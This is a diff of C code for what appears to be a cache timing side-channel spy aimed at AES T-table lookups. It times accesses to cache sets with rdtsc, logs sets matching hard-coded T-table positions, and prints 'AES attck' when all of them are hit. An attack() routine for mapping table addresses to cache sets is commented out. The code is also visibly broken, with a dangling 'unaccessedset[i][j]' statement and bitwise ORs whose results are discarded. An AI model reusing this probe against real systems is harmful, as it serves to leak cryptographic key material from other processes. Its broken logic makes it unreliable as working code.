@@ -12,10 +12,7 @@ static __inline__ unsigned long long rdtsc(void)
      return x;
 }
 
-char T0[8]="4210944";
-char T1[8]="4212992";
-char T2[8]="4215040";
-char T3[8]="4217088";
+//char T[4][8]="4210944","4212992","4215040","4217088";
 
 /*unsigned int T1=0X404900;
 unsigned int T2=0X405100;
@@ -33,16 +30,13 @@ FILE *fp=fopen(argv[1],"w+");
         double start,end;
 	long flag=0;
 
-//      const int size = 20*1024*1024; // Allocate 20M. Set much larger then L2 to clear cache
-
         //create and fill array
 
         for(i=0;i<4194305;i++)
-
                 a[i]='a';
 
 while(1)
-{
+{ flag=0;
 for(l=0;l<4096;l++)
 {       i=l*64;
 //      start=omp_get_wtime();
@@ -57,12 +51,8 @@ unsigned long long cycles = rdtsc();
                 while(count<64)
 
                 {
-
-                        //printf("%c",a[i]);
                         k=a[i];
-
                         //to skip remaining sets
-
                         count++;
                         i++;
 
@@ -70,16 +60,15 @@ unsigned long long cycles = rdtsc();
 		//cycles = rdtsc() - cycles;
 	
                 increment=4095*64;
-
                 i=i+increment;
-		
-		if(l==292)  
-			fprintf(fp,"%ld\t",cycles);
+	//	if(l==292)  
+	//		fprintf(fp,"%ld\t",cycles);
 
       }
  cycles = rdtsc() - cycles;
+
 if(cycles>8000)
-{
+{/*
 switch(l)
 {
 	case 264:flag | 1;
@@ -90,7 +79,6 @@ switch(l)
 		 break;
 	case 292: flag | (1<<3);
 		 break;
-
 	case 306: flag |(1<<4);
 		 break;
 	case 297: flag |(1<<5);
@@ -113,28 +101,41 @@ switch(l)
 		break;
 	default: break;
 }
- 
-
-if(flag == 16383)
+ */
+if(l==264||l==268||l==286||l==292||l==306||l==297||l==323||l==342||l==325||l==338||l==362||l==355||l==358||l==375)
 {
-
-fprintf(fp,"AES attck");
-attack();
-
-}
-
-}
+fprintf(fp,"%d\t",l);
 time_t now=time(NULL);
 
 strftime(buff,100,"%H:%M:%S.000",localtime(&now));
-//strftime(buff,100,"%H:%M:%S.000",localtime(&now));
+//printf("%s\n",buff);
+fprintf(fp,"%d %s\t",l,buff);
+}
+}
+
+if(flag == 16383)
+{
+fprintf(fp,"AES attck");
+time_t now=time(NULL);
+
+strftime(buff,100,"%H:%M:%S.000",localtime(&now));
 printf("%s\n",buff);
 
+//attack();
+}
+
+}
+/*time_t now=time(NULL);
+
+strftime(buff,100,"%H:%M:%S.000",localtime(&now));
+printf("%s\n",buff);
+*/
+//printf("hey");
 fprintf(fp,"\n---------------------------\n");
 }
 }
-}
-int conversion(char hexaDecimal[6])
+
+/*int conversion(char hexaDecimal[6])
 {
 char binaryNumber[24],modifiedBinary[12],ch;
     int i,j,blen,len,temp;
@@ -185,10 +186,13 @@ attack()
 	{
 		for(j=0;j<256;j++)
 		{
-			sprintf(buff,"%x",(atoi(T0)+j*4));
-			set[i]=conversion(buff);
+			sprintf(buff,"%x",(atoi(T[i])+j*4));
+			set[i][j]=conversion(buff);
+
+
+			unaccessedset[i][j]
 		}
 	}
 }
 			
-
+*/
